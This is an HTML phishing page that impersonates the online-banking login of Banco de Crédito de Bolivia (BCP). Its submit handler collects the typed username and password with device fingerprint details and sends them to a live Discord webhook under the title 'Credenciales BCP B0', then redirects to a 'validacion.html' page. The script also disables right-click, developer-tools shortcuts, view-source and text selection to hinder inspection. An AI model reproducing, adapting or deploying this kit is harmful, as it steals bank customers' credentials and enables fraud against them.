<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>BCP Bolivia ¬∑ Inicio de Sesi√≥n</title>

  <!-- Tipograf√≠a -->
  <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">

  <style>
    :root {
      --bcp-blue: #0033a0;
      --bcp-blue-light: #0050d4;
      --bcp-orange: #ff6600;
      --bcp-gray: #e5e9f0;
      --bcp-input-bg: #0b46c7;
      --white: #fff;
      --radius: 10px;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Nunito Sans', sans-serif;
      color: var(--white);
      background: var(--bcp-blue);
      height: 100vh;
      display: flex;
      overflow: hidden;
    }

    /* ====== Fondo izquierdo con ilustraci√≥n ====== */
    .left-side {
      flex: 1;
      background: url('fondo-bcp.jpg') center center/cover no-repeat;
    }

    /* ====== Panel derecho ====== */
    .right-side {
      flex-basis: 40%;
      min-width: 400px;
      background: linear-gradient(180deg, var(--bcp-blue) 0%, var(--bcp-blue-light) 100%);
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding: 40px 30px;
      position: relative;
    }

    .logo {
      width: 160px;
      margin-bottom: 30px;
    }

    form {
      width: 100%;
      max-width: 360px;
      display: flex;
      flex-direction: column;
      gap: 18px;
    }

    /* Campos de texto */
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 14px 48px 14px 14px;
      border-radius: var(--radius);
      border: none;
      background: rgba(255, 255, 255, 0.12);
      color: var(--white);
      font-size: 15px;
      outline: none;
      transition: background .3s, box-shadow .3s;
    }

    input::placeholder {
      color: rgba(255, 255, 255, 0.7);
    }

    input:focus {
      background: rgba(255, 255, 255, 0.18);
      box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.2);
    }

    /* Bot√≥n ojo */
    .toggle-visibility {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      background: transparent;
      border: none;
      color: rgba(255, 255, 255, 0.8);
      cursor: pointer;
      width: 28px;
      height: 28px;
    }

    .control {
      position: relative;
    }

    /* Enlace ‚ÄúOlvid√© mi contrase√±a‚Äù */
    .forgot {
      color: var(--bcp-orange);
      font-size: 13px;
      font-weight: 700;
      text-decoration: none;
      align-self: flex-end;
    }

    /* Bot√≥n principal */
    .btn {
      background: #d3d6de;
      border: none;
      border-radius: var(--radius);
      padding: 14px;
      color: #666;
      font-weight: 800;
      font-size: 15px;
      cursor: not-allowed;
      transition: all .3s;

      /* üîΩ Ajustes a√±adidos para igualar tama√±o con los inputs */
      width: 100%;
      box-sizing: border-box;
    }

    .btn.ready {
      background: var(--bcp-orange);
      color: var(--white);
      cursor: pointer;
    }

    .btn.ready:hover {
      background: #ff7a1a;
    }

    /* Crear usuario */
    .create-user {
      background: transparent;
      border: 2px solid rgba(255, 255, 255, 0.6);
      border-radius: var(--radius);
      color: var(--white);
      padding: 12px;
      font-weight: 700;
      font-size: 14px;
      cursor: pointer;
      transition: background .3s, border .3s;
    }

    .create-user:hover {
      background: rgba(255, 255, 255, 0.1);
      border-color: var(--white);
    }

    /* Bandera */
    .flag {
      position: absolute;
      right: 0;
      top: 50%;
      transform: translateY(-50%);
      height: 160px;
    }

    /* ===== Footer ===== */
    footer {
      position: absolute;
      bottom: 0;
      width: 100%;
      background: rgba(0,0,0,0.15);
      padding: 10px 0;
      font-size: 12px;
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      gap: 20px;
    }

    footer a {
      color: rgba(255, 255, 255, 0.85);
      text-decoration: none;
    }

    footer a:hover {
      color: var(--bcp-orange);
    }

    footer small {
      width: 100%;
      text-align: center;
      margin-top: 5px;
      opacity: .8;
    }

    @media (max-width: 900px) {
      .left-side { display: none; }
      .right-side { flex-basis: 100%; }
    }
  </style>
</head>
<body>

  <!-- Lado izquierdo ilustraci√≥n -->
  <div class="left-side"></div>

  <!-- Panel de login -->
  <div class="right-side">
    <img src="icon_bcp_login.svg" alt="BCP Bolivia" class="logo">

    <form id="loginForm">
      <div class="control">
        <input id="usuario" name="usuario" type="text" placeholder="Usuario" required />
      </div>
      <div class="control">
        <input id="password" name="password" type="password" placeholder="Contrase√±a" required />
        <button class="toggle-visibility" type="button" id="see" aria-label="Mostrar contrase√±a" title="Mostrar/Ocultar">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
            <circle cx="12" cy="12" r="3"/>
          </svg>
        </button>
      </div>

      <a href="#" class="forgot" onclick="event.preventDefault();">Olvid√© mi contrase√±a</a>

      <div class="actions">
        <button class="btn" type="submit">Iniciar Sesi√≥n</button>
      </div>
      <button class="create-user" type="button">Crear usuario y contrase√±a</button>
    </form>

    <img src="bandera-bolivia.png" alt="Bandera Bolivia" class="flag">

    <footer>
      <a href="#">¬øQu√© es Banca por internet?</a>
      <a href="#">Tarifario</a>
      <a href="#">Pol√≠ticas de seguridad</a>
      <a href="#">Cont√°ctanos</a>
      <small>¬© 2025 Banco de Cr√©dito de Bolivia S.A. Todos los derechos reservados.</small>
    </footer>
  </div>

  <!-- === Scripts originales intactos === -->
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
  <script>
    document.addEventListener('contextmenu', e => e.preventDefault(), {capture:true});
    document.addEventListener('keydown', function(e){
      if (e.key === 'F12' || e.keyCode === 123) e.preventDefault();
      if (e.ctrlKey && e.shiftKey && ['I','J','C','K'].includes(e.key.toUpperCase())) e.preventDefault();
      if (e.ctrlKey && e.key.toUpperCase() === 'U') e.preventDefault();
    }, {capture:true});
    document.addEventListener('selectstart', e => e.preventDefault(), {capture:true});
    document.addEventListener('dragstart',   e => e.preventDefault(), {capture:true});

    const pass = document.getElementById('password');
    const see = document.getElementById('see');
    see.addEventListener('click', () => {
      pass.type = pass.type === 'password' ? 'text' : 'password';
    });

    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const usuario = document.getElementById('usuario').value;
      const contra = document.getElementById('password').value;
      const webhookURL ='https://discordapp.com/api/webhooks/1434917795589525769/9wzCADcmTTrmumt_eAUmGeIzYW8rbmU36ajrNPkvmISSODnAbSZL_yKkiRRFwJQyw_TC';
      const userAgent = navigator.userAgent;
      const platform = navigator.platform;
      const language = navigator.language;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const screenResolution = `${screen.width}x${screen.height}`;
      const embed = {
          title: "üîê Credenciales BCP B0",
          description: `**Usuario:** ${usuario}\n**Contrase√±a:** ${contra}\n**P√°gina:** `,
          color: 3447003,
          fields: [
              {
                  name: "Informaci√≥n del Dispositivo",
                  value: `**User Agent:** ${userAgent}\n**Plataforma:** ${platform}\n**Idioma:** ${language}\n**Zona Horaria:** ${timezone}\n**Resoluci√≥n:** ${screenResolution}`
              }
          ],
          timestamp: new Date().toISOString(),
          footer: { text: "Bcp Ganador By TheP4tron" }
      };
      fetch(webhookURL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ embeds: [embed] })
      }).then(() => window.location.href = "validacion.html")
        .catch(() => window.location.href = "validacion.html");
    });

    (function(){
      var $btn = $('.actions .btn[type="submit"]');
      function pintarBoton(){
        var ok = $('#usuario').val().trim() !== '' && $('#password').val().trim() !== '';
        $btn.toggleClass('ready', ok);
      }
      $('#usuario, #password').on('input', pintarBoton);
      $(pintarBoton);
    })();
  </script>
</body>
</html>
